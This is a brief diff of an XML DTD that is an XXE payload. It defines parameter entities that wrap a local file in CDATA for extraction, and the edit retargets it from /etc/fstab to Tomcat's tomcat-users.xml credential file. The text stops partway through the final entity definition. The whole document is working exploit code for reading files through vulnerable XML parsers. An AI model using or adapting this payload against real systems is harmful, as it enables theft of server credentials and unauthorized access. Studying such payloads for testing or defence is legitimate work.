@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/fstab">
+<!ENTITY % file SYSTEM "file:///opt/tomcat/conf/tomcat-users.xml">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % all "<!ENTITY fileContents 
